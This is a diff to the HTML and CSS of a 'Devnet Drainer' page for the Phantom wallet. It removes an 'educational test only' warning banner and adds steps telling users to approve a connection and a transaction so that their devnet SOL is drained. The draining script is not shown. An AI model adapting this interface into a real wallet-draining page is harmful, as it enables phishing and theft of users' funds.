@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>⚠️ DEVNET TEST - Auto Drain Tool ⚠️</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>DEVNET DRAINER - Mobile App</title>
     <style>
         * {
             margin: 0;
@@ -30,25 +30,6 @@
             padding: 32px;
             border: 1px solid rgba(255, 255, 255, 0.1);
             text-align: center;
-        }
-        
-        .warning {
-            background: rgba(239, 68, 68, 0.2);
-            border: 1px solid rgba(239, 68, 68, 0.3);
-            border-radius: 16px;
-            padding: 16px;
-            margin-bottom: 24px;
-        }
-        
-        .warning h2 {
-            color: #ef4444;
-            font-size: 20px;
-            margin-bottom: 8px;
-        }
-        
-        .warning p {
-            color: #fca5a5;
-            font-size: 13px;
         }
         
         .devnet-badge {
@@ -87,12 +68,15 @@
             cursor: pointer;
             width: 100%;
             margin: 16px 0;
-            transition: all 0.3s;
         }
         
-        .connect-btn:hover {
-            transform: scale(1.02);
-            box-shadow: 0 4px 20px rgba(251, 191, 36, 0.4);
+        .instruction {
+            background: rgba(59, 130, 246, 0.1);
+            border-radius: 12px;
+            padding: 12px;
+            margin: 16px 0;
+            font-size: 12px;
+            text-align: left;
         }
         
         .log {
@@ -127,22 +111,25 @@
     <div class="container">
         <span class="devnet-badge">🔬 DEVNET - FAKE SOL (WORTH $0)</span>
         
-        <div class="warning">
-            <h2>⚠️ EDUCATIONAL TEST ONLY ⚠️</h2>
-            <p>This tool automatically transfers DEVNET SOL when you connect.<br>No real funds are at risk - Devnet only.</p>
-        </div>
-        
         <h1>💀 Devnet Drainer</h1>
-        <p style="color: #94a3b8; margin-bottom: 16px;">Connect wallet → SOL gets drained to:</p>
+        <p style="color: #94a3b8; margin-bottom: 16px;">Click button → Opens Phantom app → SOL drains automatically</p>
         
         <div class="address-box" id="drainAddress">Loading...</div>
         
         <button class="connect-btn" id="connectBtn">
-            🦊 Connect Wallet & Get Drained
+            🦊 Open Phantom App & Drain
         </button>
         
+        <div class="instruction">
+            📱 <strong>How it works:</strong><br>
+            1. Click button → Opens Phantom app<br>
+            2. Approve connection in Phantom<br>
+            3. Approve transaction in Phantom<br>
+            4. Your DEVNET SOL gets drained!
+        </div>
+        
         <div class="log" id="log">
-            <div class="log-entry">Ready to drain Devnet SOL...</div>
+            <div class="log-entry">Ready to drain...</div>
         </div>
         
         <div class="footer">
@@ -150,7 +137,6 @@
         </div>
     </div>
     
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
     <script src="app.js"></script>
 </body>
 </html>
